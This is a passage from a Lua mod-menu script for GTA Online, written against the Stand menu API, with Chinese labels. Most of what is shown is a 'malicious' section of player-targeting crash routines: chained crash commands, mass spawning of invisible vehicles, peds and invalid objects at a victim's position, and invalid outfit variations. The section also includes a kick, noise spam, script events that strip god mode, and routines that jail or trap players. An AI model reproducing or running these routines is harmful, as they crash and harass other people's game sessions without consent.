            menu.trigger_commands("crashv6"..players.get_name(player_id))
            util.yield(500)
            menu.trigger_commands("crashv7"..players.get_name(player_id))
            util.yield(500)
            menu.trigger_commands("crashv8"..players.get_name(player_id))
            util.yield(500)
            menu.trigger_commands("crashv9"..players.get_name(player_id))
            util.yield(500)
            menu.trigger_commands("crashv29"..players.get_name(player_id))
            util.yield(500)
            menu.trigger_commands("crashv91"..players.get_name(player_id))
            util.yield(500)
            menu.trigger_commands("crashv97"..players.get_name(player_id))
            util.yield(500)
            menu.trigger_commands("crashv84"..players.get_name(player_id))
            util.yield(700)
            menu.trigger_commands("crashv51"..players.get_name(player_id))
            util.yield(2000)
            menu.trigger_commands("crash"..players.get_name(player_id))
            util.yield(400)
            menu.trigger_commands("ngcrash"..players.get_name(player_id))
            util.yield(400)
            menu.trigger_commands("footlettuce"..players.get_name(player_id))
            util.yield(400)
            menu.trigger_commands("steamroll"..players.get_name(player_id))
            util.yield(200)
            menu.trigger_commands("choke"..players.get_name(player_id))
            util.yield(1800)
            menu.trigger_commands("rlag3"..players.get_name(player_id))
            menu.trigger_commands("rcleararea")
            menu.trigger_commands("trafficpotato off")
            util.yield(8000)
            menu.trigger_commands("anticrashcamera off")
        end)
    end
		
	menu.action(crashes, "Tsar Bomb 崩溃 (Model)", {"tsarbomba5"}, "", function()
        local objective = player_id
        menu.trigger_commands("anticrashcamera on")
        menu.trigger_commands("trafficpotato on")
        menu.trigger_commands("rlag3"..players.get_name(player_id))
        util.yield(2500)
        menu.trigger_commands("crashv27"..players.get_name(player_id))
        util.yield(620)
        menu.trigger_commands("crashv18"..players.get_name(player_id))
        util.yield(620)
        menu.trigger_commands("crashv12"..players.get_name(player_id))
        util.yield(820)
        menu.trigger_commands("crashv10"..players.get_name(player_id))
        util.yield(620)
        menu.trigger_commands("crashv5"..players.get_name(player_id))
        util.yield(620)
        menu.trigger_commands("crashv4"..players.get_name(player_id))
        util.yield(620)
        menu.trigger_commands("crashv1"..players.get_name(player_id))
        util.yield(720)
        menu.trigger_commands("crashv13"..players.get_name(player_id))
        util.yield(720)
        menu.trigger_commands("crashv14"..players.get_name(player_id))
        util.yield(2800)
        menu.trigger_commands("crash"..players.get_name(player_id))
        util.yield(550)
        menu.trigger_commands("ngcrash"..players.get_name(player_id))
        util.yield(550)
        menu.trigger_commands("footlettuce"..players.get_name(player_id))
        util.yield(550)
        menu.trigger_commands("steamroll"..players.get_name(player_id))
        util.yield(550)
        menu.trigger_commands("choke"..players.get_name(player_id))
        util.yield(550)
        menu.trigger_commands("flashcrash"..players.get_name(player_id))
        util.yield(200)
        util.yield(400)
        menu.trigger_commands("smash"..players.get_name(player_id))
        if PLAYER.GET_VEHICLE_PED_IS_IN(ped, false) then
            menu.trigger_commands("slaughter"..players.get_name(player_id))
        end
        util.yield(1500)
        menu.trigger_commands("rlag3"..players.get_name(player_id))
        menu.trigger_commands("rcleararea")
        menu.trigger_commands("trafficpotato off")
        util.yield(8000)
        menu.trigger_commands("anticrashcamera off")
    end)
    crashes1 = menu.list(malicious, "崩溃选项1", {}, "", function(); end)
        menu.action(crashes1, "无效物体崩溃", {}, "就崩绿玩", function()
            local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
            local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
            local Object_pizza1 = CreateObject(0x7367D224, TargetPlayerPos)
            local Object_pizza2 = CreateObject(2155335200, TargetPlayerPos)
            local Object_pizza3 = CreateObject(3026699584, TargetPlayerPos)
            local Object_pizza4 = CreateObject(-1348598835, TargetPlayerPos)
            local Object_pizza5 = CreateObject(0xFBF7D21F, TargetPlayerPos)
            local Object_pizza6 = CreateObject(3613262246, TargetPlayerPos)
            for i = 0, 100 do
                local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza1, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza3, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza4, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza5, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza6, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
                util.yield(10)
            end
            util.yield(2000)
            entities.delete_by_handle(Object_pizza1)
            entities.delete_by_handle(Object_pizza2)
            entities.delete_by_handle(Object_pizza3)
            entities.delete_by_handle(Object_pizza4)
            entities.delete_by_handle(Object_pizza5)
            entities.delete_by_handle(Object_pizza6)
        end)
		menu.click_slider(crashes1, "导弹车崩溃", {"Chernobog Crash"}, "1 = V1, 2 = V2", 1, 2, 1, 1, function(on_change)
            if on_change == 1 then	
                menu.trigger_commands("anticrashcam on")
                local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
                local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
                SpawnedVehicleList = { };
                for i = 1, 60 do
                    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
                    SpawnedVehicleList[i] = CreateVehicle(util.joaat("chernobog"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed), true)
                    ENTITY.FREEZE_ENTITY_POSITION(SpawnedVehicleList[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedVehicleList[i], false, 0)
                    util.yield(50)
                end
                util.yield(5000)
                for i = 1, 60 do
                    entities.delete_by_handle(SpawnedVehicleList[i])
                end
                menu.trigger_commands("anticrashcam off")
        
            end	
            if on_change == 2 then
                menu.trigger_commands("anticrashcam on")
                local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
                local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
                TargetPlayerPos.y = TargetPlayerPos.y + 1050
                SpawnedVehicleList1 = { };
                for i = 1, 60 do
                    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
                    SpawnedVehicleList1[i] = CreateVehicle(util.joaat("chernobog"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed), true)
                    ENTITY.FREEZE_ENTITY_POSITION(SpawnedVehicleList1[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedVehicleList1[i], false, 0)
                    util.yield(50)
                end
                util.yield(2000)
                for i = 1, 60 do
                    entities.delete_by_handle(SpawnedVehicleList1[i])
                end
        
                util.yield(1000)
                SpawnedVehicleList2 = { };
                for i = 1, 50 do
                    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
                    SpawnedVehicleList2[i] = CreateVehicle(util.joaat("chernobog"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed), true)
                    ENTITY.FREEZE_ENTITY_POSITION(SpawnedVehicleList2[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedVehicleList2[i], false, 0)
                    util.yield(50)
                end
                util.yield(2000)
                for i = 1, 50 do
                    entities.delete_by_handle(SpawnedVehicleList2[i])
                end
        
                menu.trigger_commands("anticrashcam off")
            end
            end)
            menu.action(crashes1,"无效衣服崩溃", {}, "",  function()
                menu.trigger_commands("anticrashcam on")
                local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
                local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
                local SelfPlayerPed = PLAYER.PLAYER_PED_ID();
                local Spawned_Mike = CreatePed(26, util.joaat("player_zero"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
                for i = 0, 500 do
                    PED.SET_PED_COMPONENT_VARIATION(Spawned_Mike, 0, 0, math.random(0, 10), 0)
                    ENTITY.SET_ENTITY_COORDS(Spawned_Mike, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, true, false, false, true);
                    util.yield(10)
                end
                entities.delete_by_handle(Spawned_Mike)
                menu.trigger_commands("anticrashcam off")
            end)
            menu.action(crashes1, "载具动作崩溃", {}, "崩溃绿玩或外置菜单（2-10S生效）", function()
                local TPP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
                local pos = ENTITY.GET_ENTITY_COORDS(TPP, true)
                pos.z = pos.z + 10
                veh = entities.get_all_vehicles_as_handles()
                
              for i = 1, #veh do
              NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh[i])
              ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh[i], pos.x,pos.y,pos.z, ENTITY.GET_ENTITY_HEADING(TPP), 10)
              TASK.TASK_VEHICLE_TEMP_ACTION(TPP, veh[i], 18, 999)
              TASK.TASK_VEHICLE_TEMP_ACTION(TPP, veh[i], 16, 999)
              end
          end)
          menu.action(crashes1, "傻狗某船自崩", {}, "崩丫的", function()
            menu.trigger_commands("anticrashcam on")
            local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
            local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
            local SpawnPed_Wade = { }
            for i = 1, 60 do
                SpawnPed_Wade[i] = CreatePed(26, util.joaat("ig_wade"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
                util.yield(1)
            end
            util.yield(5000)
            for i = 1, 60 do
                entities.delete_by_handle(SpawnPed_Wade[i])
            end
            menu.trigger_commands("anticrashcam off")
        end)
        menu.action(crashes1, "重复崩溃", {}, "", function()
            menu.trigger_commands("anticrashcam on")
            local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
            local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
            local SpawnPed_Wade = { }
            for i = 1, 60 do
                SpawnPed_Wade[i] = CreatePed(26, util.joaat("ig_wade"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
                util.yield(1)
            end
            util.yield(5000)
            for i = 1, 60 do
                entities.delete_by_handle(SpawnPed_Wade[i])
            end
            menu.trigger_commands("anticrashcam off")
        end)
        menu.action(crashes1, "富兰克林崩溃", {}, "崩溃绿玩或不那么昂贵的菜单", function()
            util.toast("The crash has started. Please stay away from the player and do not watch the player")
            menu.trigger_commands("anticrashcam on")
            local TPP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
            local pos = ENTITY.GET_ENTITY_COORDS(TPP, true)
            for i = 0 , 30 do 
                invalidpeda1 = CreatePed(26, util.joaat("player_one"), pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
                ENTITY.SET_ENTITY_INVINCIBLE(invalidpeda, true)
                util.yield(1)
            end
            util.yield(1)
            for i = 0 , 30 do 
                invalidpeda2 = CreatePed(26, util.joaat("player_one"), pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
                ENTITY.SET_ENTITY_INVINCIBLE(invalidpeda, true)
                util.yield(1)
            end
            util.yield(1)
            for i = 0 , 50 do 
                invalidpeda3 = CreatePed(26, util.joaat("player_one"), pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
                ENTITY.SET_ENTITY_INVINCIBLE(invalidpeda, true)
                util.yield(1)
            end
            util.yield(5000)
            util.yield(300)
            notification("崩溃完成，等待删除PED",colors.red)
            util.yield(300)
            local count = 0
                for k,ent in pairs(entities.get_all_peds_as_handles()) do
                    if not PED.IS_PED_A_PLAYER(ent) then
                        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
                        entities.delete_by_handle(ent)
                        util.yield()
                        count = count + 1
                    end
                end
            notification("done",colors.red)
            util.yield(300)
            menu.trigger_commands("anticrashcam off")
        end)
        menu.action(crashes1, "DDos", {}, "崩溃宇宙", function()
        util.toast("发送DDos攻击给" ..players.get_name(player_id))
        local percent = 0
        while percent <= 100 do
            util.yield(100)
            util.toast(percent.. "% done")
            percent = percent + 1
        end
        util.yield(2000)
        util.toast("开个玩笑^^")
    end)
    local kicks = menu.list(malicious, "踢出选项", {}, "")

    menu.action(kicks, "智能踢", {""}, "", function()
        menu.trigger_commands("kick" .. players.get_name(player_id))
end)
	
    local scriptev = menu.list(malicious, "噪音", {}, "")

    menu.action(scriptev, "噪音1", {}, "", function()
        local time = (util.current_time_millis() + 2000)
        while time > util.current_time_millis() do
            menu.trigger_commands("scripthost")
            local pc = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id))
            for i = 1, 10 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, "LOSER", pc.x, pc.y, pc.z, "HUD_AWARDS", true, 9999, false)
            end
            util.yield_once()
        end
    end)

    menu.action(scriptev, "噪音2", {}, "", function()
        local time = (util.current_time_millis() + 2000)
        while time > util.current_time_millis() do
            menu.trigger_commands("scripthost")
            local pc = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id))
            for i = 1, 10 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, "1st_Person_Transition", pc.x, pc.y, pc.z, "PLAYER_SWITCH_CUSTOM_SOUNDSET", true, 9999, false)
            end
            util.yield_once()
        end
    end)

    menu.action(scriptev, "噪音3", {}, "", function()
        local time = (util.current_time_millis() + 2000)
        while time > util.current_time_millis() do
            menu.trigger_commands("scripthost")
            local pc = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id))
            for i = 1, 10 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, "Hit", pc.x, pc.y, pc.z, "RESPAWN_ONLINE_SOUNDSET", true, 9999, false)
            end
            util.yield_once()
        end
    end)

    menu.action(scriptev, "防空警报", {}, "", function()
        local time = (util.current_time_millis() + 2000)
        while time > util.current_time_millis() do
            local pc = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id))
            for i = 1, 10 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, "Air_Defences_Activated", pc.x, pc.y, pc.z, "DLC_sum20_Business_Battle_AC_Sounds", true, 9999, false)
            end
            util.yield_once()
        end
    end)

    local antimodder = menu.list(malicious,"制裁挂壁", {}, "")
    local kill_godmode = menu.list(antimodder, "杀死无敌玩家", {}, "")
    menu.action(kill_godmode, "发送恶搞", {""}, "", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z + 1, pos.x, pos.y, pos.z, 99999, true, util.joaat("weapon_stungun"), players.user_ped(), false, true, 1.0)
    end)

    menu.slider_text(kill_godmode, "Crush", {}, "", {"Khanjali", "APC"}, function(index, veh)
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        local vehicle = util.joaat(veh)
        request_model(vehicle)

        switch veh do
            case "Khanjali":
            height = 2.8
            offset = 0
            break
            case "APC":
            height = 3.4
            offset = -1.5
            break
        end

        if TASK.IS_PED_STILL(ped) then
            distance = 0
        elseif not TASK.IS_PED_STILL(ped) then
            distance = 3
        end

        local vehicle1 = entities.create_vehicle(vehicle, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, offset, distance, height), ENTITY.GET_ENTITY_HEADING(ped))
        local vehicle2 = entities.create_vehicle(vehicle, pos, 0)
        local vehicle3 = entities.create_vehicle(vehicle, pos, 0)
        local vehicle4 = entities.create_vehicle(vehicle, pos, 0)
        local spawned_vehs = {vehicle4, vehicle3, vehicle2, vehicle1}
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
        ENTITY.SET_ENTITY_VISIBLE(vehicle1, false)
        util.yield(5000)
        for i = 1, #spawned_vehs do
            entities.delete_by_handle(spawned_vehs[i])
        end
    end)

    player_toggle_loop(antimodder, player_id, "关闭他的无敌", {}, "大部分菜单拦截", function()
        util.trigger_script_event(1 << player_id, {0xAD36AA57, player_id, 0x96EDB12F, math.random(0, 0x270F)})
    end)

    menu.action(trolling, "送进监狱", {}, "", function()
        local my_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id))
        local my_ped = PLAYER.GET_PLAYER_PED(players.user())
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(my_ped, 1628.5234, 2570.5613, 45.56485, true, false, false, false)
        menu.trigger_commands("givesh " .. players.get_name(player_id))
        menu.trigger_commands("summon " .. players.get_name(player_id))
        menu.trigger_commands("invisibility on")
        menu.trigger_commands("otr")
        util.yield(5000)
        menu.trigger_commands("invisibility off")
        menu.trigger_commands("otr")
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(my_ped, my_pos.x, my_pos.y, my_pos.z)
    end)

    local function GiveWeapon(attacker)
        if (weapon0 == true) then
            WEAPON.REQUEST_WEAPON_ASSET(unarmed, 31, 0)
            WEAPON.GIVE_WEAPON_TO_PED(attacker, unarmed, 1, false, true)
        elseif (weapon1 == true) then
            WEAPON.REQUEST_WEAPON_ASSET(machete, 31, 0)
            WEAPON.GIVE_WEAPON_TO_PED(attacker, machete, 1, false, true)
        elseif (weapon2 == true) then
            WEAPON.REQUEST_WEAPON_ASSET(pistol, 31, 0)
            WEAPON.GIVE_WEAPON_TO_PED(attacker, pistol, 1, false, true)
        elseif (weapon3 == true) then
            WEAPON.REQUEST_WEAPON_ASSET(stungun, 31, 0)
            WEAPON.GIVE_WEAPON_TO_PED(attacker, stungun, 1, false, true)
        elseif (weapon4 == true) then
            WEAPON.REQUEST_WEAPON_ASSET(atomizer, 31, 0)
            WEAPON.GIVE_WEAPON_TO_PED(attacker, atomizer, 1, false, true)
        elseif (weapon5 == true) then
            WEAPON.REQUEST_WEAPON_ASSET(shotgun, 31, 0)
            WEAPON.GIVE_WEAPON_TO_PED(attacker, shotgun, 1, false, true)
        elseif (weapon6 == true) then
            WEAPON.REQUEST_WEAPON_ASSET(sniper, 31, 0)
            WEAPON.GIVE_WEAPON_TO_PED(attacker, sniper, 1, false, true)
        elseif (weapon7 == true) then
            WEAPON.REQUEST_WEAPON_ASSET(microsmg, 31, 0)
            WEAPON.GIVE_WEAPON_TO_PED(attacker, microsmg, 1, false, true)
        elseif (weapon8 == true) then
            WEAPON.REQUEST_WEAPON_ASSET(minigun, 31, 0)
            WEAPON.GIVE_WEAPON_TO_PED(attacker, minigun, 1, false, true)
        elseif (weapon9 == true) then
            WEAPON.REQUEST_WEAPON_ASSET(RPG, 31, 0)
            WEAPON.GIVE_WEAPON_TO_PED(attacker, RPG, 1, false, true)
        elseif (weapon10 == true) then
            WEAPON.REQUEST_WEAPON_ASSET(hellbringer, 31, 0)
            WEAPON.GIVE_WEAPON_TO_PED(attacker, hellbringer, 1, false, true)
        elseif (weapon11 == true) then
            WEAPON.REQUEST_WEAPON_ASSET(railgun, 31, 0)
            WEAPON.GIVE_WEAPON_TO_PED(attacker, railgun, 1, false, true)
        end
    end

    local function setAttribute(attacker)
        PED.SET_PED_COMBAT_ATTRIBUTES(attacker, 38, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(attacker, 5, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(attacker, 0, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(attacker, 12, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(attacker, 22, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(attacker, 54, true)
        PED.SET_PED_COMBAT_RANGE(attacker, 4)
        PED.SET_PED_COMBAT_ABILITY(attacker, 3)
    end

    local pclpid = {}
    
    menu.action(trolling, "克隆玩家", {}, "", function()
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local c = ENTITY.GET_ENTITY_COORDS(p)
        local pclone = entities.create_ped(26, ENTITY.GET_ENTITY_MODEL(p), c, 0)
        pclpid [#pclpid + 1] = pclone 
        PED.CLONE_PED_TO_TARGET(p, pclone)
    end)





    menu.action(trolling, "传送到密室", {}, "", function()
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local c = ENTITY.GET_ENTITY_COORDS(p)
        local defx = c.x
        local defy = c.y 
        local defz = c.z
        local veh = PED.GET_VEHICLE_PED_IS_IN(p, true)
        if PED.IS_PED_IN_ANY_VEHICLE(p, false) then
            STREAMING.REQUEST_MODEL(floorbr)
            while not STREAMING.HAS_MODEL_LOADED(floorbr) do
                STREAMING.REQUEST_MODEL(floorbr)
                util.yield()
            end
            STREAMING.REQUEST_MODEL(wallbr)
            while not STREAMING.HAS_MODEL_LOADED(wallbr) do
                STREAMING.REQUEST_MODEL(wallbr)
                util.yield()
            end
            RequestControl(veh)
            local success, floorcoords
            repeat
                success, floorcoords = util.get_ground_z(c.x, c.y)
                util.yield()
            until success
            c.z = floorcoords - 100
            ENTITY.SET_ENTITY_COORDS(veh, c.x, c.y, c.z, false, false, false, false)

            local c = ENTITY.GET_ENTITY_COORDS(p)
            local defz = c.z
            c.z = defz - 2
            local spawnedfloorbr = entities.create_object(floorbr, c)
            c.z = c.z + 10
            local spawnedroofbr = entities.create_object(floorbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedroofbr, 180.0, 0.0, 0.0, 1, true)

            defz = c.z - 5
            c.x = c.x + 4
            c.z = defz
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.x = c.x - 8
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.y = c.y - 8
            c.x = defx + 10.5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.y = c.y - 14.5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.y = c.y - 7.2
            c.x = defx + 3.5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.y = defy + 6.5
            c.x = defx + 11
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.x = defx - 12
            c.y = defy + 4
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.y = defy - 7
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.y = c.y - 10
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.y = c.y - 7
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.y = defy - 10
            c.x = defx - 19
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.x = defx - 3
            c.y = defy + 6.5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.x = defx + 25
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.x = c.x + 7
            c.y = defy
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.y = defy - 14.5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.y = c.y - 7
            c.x = c.x - 7
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.y = c.y - 7
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.y = c.y - 7
            c.x = c.x - 7.5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.x = c.x - 6.5
            c.y = c.y - 6.5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.x = c.x - 7.5
            c.y = c.y - 7
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.x = c.x - 14
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.x = c.x - 6.5
            c.y = c.y + 7
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.x = c.x - 7.5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.x = c.x - 6.5
            c.y = c.y + 7
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.y = c.y + 14
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.y = c.y + 14
